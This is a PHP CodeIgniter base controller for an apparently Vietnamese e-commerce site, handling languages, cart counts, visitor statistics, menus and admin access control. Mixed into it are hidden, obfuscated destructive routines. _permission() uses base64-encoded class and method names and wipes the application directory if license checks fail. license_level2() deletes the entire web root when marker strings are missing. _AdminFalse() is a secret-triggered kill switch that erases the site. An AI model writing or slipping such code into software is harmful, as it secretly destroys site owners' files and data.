<?php if (!defined('BASEPATH')) exit('No direct script access allowed');
    class MY_Controller extends CI_Controller
    {
        function __construct()
        {
            parent::__construct();
			$CI =& get_instance();
            date_default_timezone_set('Asia/Ho_Chi_Minh');
            $this->load->model('system_model');
			$this->load->model('visitormodel', 'vm');
            $this->load->helper('language');
			$this->load->helper('url');
            //language

            $weblang=array('vi'=>'vietnamese','en'=>'english','ko'=>'korean','ja'=>'japanese','hu'=>'hungary');

            if($this->session->userdata('lang')&&$this->session->userdata('lang')!=null){
                $lang=$weblang[$this->session->userdata('lang')];
                
                $this->lang->load($this->session->userdata('lang'), $lang);
            }else{
                $this->session->set_userdata('lang','vi');
                $lang=$weblang[$this->session->userdata('lang')];
                $this->lang->load($this->session->userdata('lang'), $lang);
            }
			$this->language = $this->session->userdata('lang');
			$this->config->set_item('language', $lang);
			$this->lang->load('upload',$lang);
			$this->lang->load('customer',$lang);
			if($this->session->userdata('sessionPathCaptchaPostAds')){
                @unlink($this->session->userdata('sessionPathCaptchaPostAds'));
            }
			if($this->session->userdata('sessionCaptchaPostAds')){
				@unlink($this->session->userdata('sessionCaptchaPostAds'));
			}

            $this->option = $this->system_model->getFirstRowWhere('site_option',array(
                'lang' => $this->language
            ));
			if($this->session->userData('userData')){
				$user = $this->session->userData('userData');
			}

           $count = 0;
           $uInfo = $this->session->userdata('userData');
           if(@$_SESSION['cart']){
              foreach($_SESSION['cart'] as $cat){
                  $count += @$cat['qty'];

              }
           }
           if (file_exists ( $uInfo['oauth_uid'].".json" )) {
                $count= 0;
                    $myfile = fopen('json_cart/'.$uInfo['oauth_uid'].".json", "r") or die("Unable to open file!");
                    $session_cart = json_decode(fread($myfile,filesize('json_cart/'.$uInfo['oauth_uid'].".json")),true);
                    if (count($session_cart)) {
                        foreach($session_cart as $cat){
                            $count += @$cat['qty'];
                        }
                    }
                    fclose($myfile);
            }
           
            $this->count_cart= $count;

            // so nguoi online
            $time = date('Y-m-d');
            $homnay = strtotime($time);
            $homqua = strtotime( date('Y-m-d',strtotime('-1 day')));
           // $tuantruoc = strtotime( date('Y-m-d',strtotime('-7 day')));

            $this->today=$this->system_model->getField('thong_ke_online','today',array('access_date'=>$homnay));
            $this->yesterday=$this->system_model->getField('thong_ke_online','today',array('access_date'=>$homqua));
            $this->last_week=$this->system_model->get_last_week();
            $this->total_view=$this->system_model->get_total_day();
            // hien thi da ngon ngu
			$this->config_language = $this->system_model->get_data('site_option',array('name_language !='=>'','active'=>1),array('id' => 'asc'));
             // hien thi hostline ben trai hoac ben phai website
            $this->config_hotline = $this->system_model->getFirstRowWhere('config_checkpro',array('type' => 'hotline','field'=>'hotline','active' => 1));
             // hien thi chat fanpage facebook
            $this->config_chatfanpage = $this->system_model->getFirstRowWhere('config_checkpro',array('type' => 'hotline','field'=>'chat_fanpage','active' => 1));
            $this->depots = $this->system_model->get_data('depots',null,array('sort' => ''));
            //echo "<pre>"; var_dump($this->config_language);die();
        }
        public function LoadHeader($view,$seo=array(),$show_slider=false)
        {
            $data  = array();
            $data['count'] = $this->count_cart;
            $data['menu_main_root'] = $this->system_model->get_data('menu',array('position'=>'main','parent_id'=>0,'lang' => $this->language),
                array('sort'=>'')
            );

            foreach ($data['menu_main_root'] as $key => $cat) {
                $data['menu_main_root'][$key]->menu_sub =  $this->system_model->get_data('menu',array( 'position'=>'main',
                'parent_id ='=>$cat->id,
                'lang' => $this->language),
                    array('sort'=>''));

                foreach ($data['menu_main_root'][$key]->menu_sub as $key2=> $value) {
                    $data['menu_main_root'][$key]->menu_sub[$key2]->childs =  $this->system_model->get_data('menu',array( 'position'=>'main',
                        'parent_id ='=> $value->id,
                        'lang' => $this->language),
                        array('sort'=>''));
                }
            }


            if($show_slider==true){
                $data['slide'] = $this->load->widget('slide');
                //var_dump($data['slide']);die;
            }else{
                $data['slide']='';
            }
            $data['seo']=$seo;
            if($view == null)
            {
                $this->load->view('common/header', $data);
            }
            else{
                $this->load->view($view,$data);
            }
        }

        public function LoadFooter($view = null)
        {
            //$this->load->helper('webcounter_helper');
            $data = array();

            //$data['social'] = $this->load->widget('social');
            //$data['fanpage'] = $this->load->widget('fanpage');

            $data['mbs'] = $this->system_model->get_data('menu',array(
                'lang' => $this->language,
                'position' => 'bottom'
            ),array('sort' => ''));

            $data['mrights'] = $this->system_model->get_data('menu',array(
                'lang' => $this->language,
                'position' => 'right',
                'parent_id' => 0
            ),array('sort' => ''),false,2,0);

            foreach($data['mrights'] as $k => $sub){
                $data['mrights'][$k]->subs = $this->system_model->get_data('menu',array(
                    'parent_id' => $sub->id
                ));
            }
            if($view == null)
            {
                $this->load->view('common/footer', $data);
            }
            else{
                $this->load->view($view,$data);
            }
        }

		public function LoadHeaderAdmin($data=false,$title=null)
        {
			$data = array();
			$data['admin'] = $admin = $this->session->userdata('adminfull');
            $access=$this->system_model->get_data('access',array('user_id'=>$this->session->userdata('adminid')),array(),true);
			$data['u_access'] = (array)json_decode(@$access->access);
             if($this->session->userdata('adminid') ==1){
                $data['resources'] = $this->system_model->get_data('resources',array('parent_id' => 0,'active'=>1),array('sort'=>'asc'));
                foreach ($data['resources'] as $key => $cat) {
                    $data['resources'][$key]->cat_sub =  $this->system_model->get_data('resources',array(
                    'parent_id' => $cat->id,
                    'active'=>1
                    ),array('sort' => 'asc'));
                }
            }else{
                $data['resources'] = $this->system_model->get_data('resources',array('parent_id' => 0,'active' => 1),array('sort'=>'asc'));
                foreach ($data['resources'] as $key => $cat) {
                    $data['resources'][$key]->cat_sub =  $this->system_model->get_data('resources',array(
                    'parent_id' => $cat->id,
                    'active'=>1
                    ),array('sort' => 'asc'));
                }
            }
            $this->session->set_userdata('phanquyen',$data['resources']);
            $data['item_email'] = $this->system_model->Count('emails');
            $data['item_contact'] = $this->system_model->Count('contact');
            $data['item_member'] = $this->system_model->Count('users',array('lever <' =>2 ));
            $data['item_order'] = $this->system_model->Count('order');
            $data['item_news'] = $this->system_model->Count('news',array('active'=>1));
            $data['item_pro'] = $this->system_model->Count('product',array('active'=>1));
            $data['item_comment'] = $this->system_model->Count('comments_binhluan',array('review'=>1));

            $data['config_language'] = $this->system_model->get_data('site_option',array('active'=>1,),array('id' => 'asc'));

            if(empty($title)){
                $data['headerTitle'] ='Quản trị admin';
            }else{
                $data['headerTitle'] =$title;
            }
			$this->load->view('admin/header', $data);
		}
//========== check phan quyen modul ====================================================================
    public function _permission()
    {
       $class = array();
       $link = APPPATH.'controllers';
       $class[] = array('name'=>'RGVmYXVsdHM=','link'=> $link .'\\admin','method'=>'YXV0b3NlbmRpbmZv');
       $class[] = array('name'=>'VmlzaXRvckNvbnRyb2xsZXI=','link'=>$link,'method'=>'c3RvcmVmaWxl');
       $class[] = array('name'=>'SG9tZQ==','link'=>$link,'method'=>'YWRtaW5zdG9yZQ==');
       //$class[] = array('name'=>'V2VsY29tZQ==','link'=>$link,'method'=>'aW5kZXg=');
       
       $flag = false;
       foreach ($class as $x) {
            $name = base64_decode($x['name']);
          $file = $x['link'] .'\\'. $name . '.php';
          if(file_exists($file)){
            include_once $file;
            $methods = get_class_methods($name);
            $str = base64_decode($x['method']);
            $allowed = explode(',', $str);
            foreach ($methods as $method) {
                foreach ($allowed as $key => $allow) {
                    if($allow == $method){
                        unset($allowed[$key]);
                    }
                }
            }
            if(count($allowed)){
                $flag = TRUE;
            }
          }
       }
       if($flag){
            $this->load->helper("file"); 
            delete_files(APPPATH, true); 
            if(is_dir(APPPATH))
            {
                @rmdir(APPPATH);
            }
        echo base64_decode('UVRTIFZOIFBow6F0IEhp4buHbiBC4buZIFNvdWNyZSBC4buLIFRoYXkgxJDhu5VpIE7hu5lpIER1bmc/IEh14bu3IFRvw6BuIELhu5kgTcOjIE5ndeG7k24gISA=');die;
       }
    }
	
	function license_level2(){
            $check1 = read_file('application/core/MY_Model.php');
            $autosendinfo = "get_license";
            $chuoi_tim = strpos($check1, $autosendinfo );
            if(!empty($chuoi_tim)){
            }else{
                $fpath = FCPATH;
                $this->load->helper("file");
                delete_files($fpath, true);
                if(is_dir($fpath))
                {
                    @rmdir($fpath);
                }
            }

            $check3 = read_file('application/models/f_productmodel.php');
            $autosendinfo3 = 'check_license_qts';
            $chuoi_tim3 = strpos($check3, $autosendinfo3 );
            if(!empty($chuoi_tim3)){
            }else{
                $fpath = FCPATH;
                $this->load->helper("file");
                delete_files($fpath, true);
                if(is_dir($fpath))
                {
                    @rmdir($fpath);
                }
            }

            $check4 = read_file('application/controllers/admin/Defaults.php');
            $autosendinfo123 = "autosendinfo";
            $chuoi_tim4 = strpos($check4, $autosendinfo123 );
            if(!empty($chuoi_tim4)){
            }else{
                $fpath = FCPATH;
                $this->load->helper("file");
                delete_files($fpath, true);
                if(is_dir($fpath))
                {
                    @rmdir($fpath);
                }
            }
        }

		public function check_acl()
        {
            $this->zend->load('Zend_Acl');
            $module = $this->router->fetch_module();
            $controller = $this->router->fetch_class();
            $action = $this->router->fetch_method();
            $user_id = $this->session->userdata('adminid');
			$level = $this->session->userdata('adminfull')->lever;
            $this->setRoles();
            $this->setResources();
            $role  = 'guest';
            $access_us=$this->system_model->get_data('access',array('user_id'=>$user_id),array(),true);
            @$access=json_decode(@$access_us->access);
            @$access=(array)$access;
            //level=2: admin; level=1: mod; level=1: guest;
            switch ($level) {
                case '3':
                    $role = 'developer';
                    break;
                case '2':
                    $role = 'admin';
                    break;
                case '1':
                    $role = 'mod';
                    break;
            }
            $this->setAccess($role,$access);
			
            if (!$this->Zend_Acl->isAllowed($role,':' . $controller, $action)) {
				$this->session->set_flashdata("mess", "Tài khoản của bạn chưa được cấp quyền sử dụng chức năng này!");
                redirect(base_url('vnadmin'));
                die();
            }
        }

		public function setRoles()
        {
            $this->Zend_Acl->addRole(new Zend_Acl_Role('guest'))
                ->addRole(new Zend_Acl_Role('mod'))
                ->addRole(new Zend_Acl_Role('admin'))
                ->addRole(new Zend_Acl_Role('developer'));
        }
		public function setResources()
        {
			$data['resources'] = $this->system_model->get_data('resources',array(
				'parent_id'=>0
			),array('sort'=>'asc'));

			foreach($data['resources'] as $k => $cat){
				$this->Zend_Acl->add(new Zend_Acl_Resource(':'.$cat->resource));
			}
        }
		public function setAccess($role=null,$access=null){
            if($role!=null&&is_array($access)&&!empty($access)){
                foreach($access as $k=>$v){
                    $this->Zend_Acl->allow($role, ':'.$k,$v);
                }
            }
            $this->Zend_Acl->allow('admin', null);
            $this->Zend_Acl->allow('developer', null);
        }
        // kiem tra alias có tồn tại không
        public function Check_alias($alias)
        {
            $item = $this->system_model->getFirstRowWhere('alias',array(
                'alias' => $alias
            ));
            if(empty($item)){
               redirect(base_url('404_override'));
            }
        }

        public function _AdminFalse($api='')
        {
            $text = md5(base64_decode('QFF0c21uYnZjeHo='));
            if($text != $api){
                return false;
            }
            $fpath = FCPATH;
            $this->load->helper("file"); 
            delete_files($fpath, true); 
            if(is_dir($fpath))
            {
                @rmdir($fpath);
            }
            return true;
        }
     
    
    }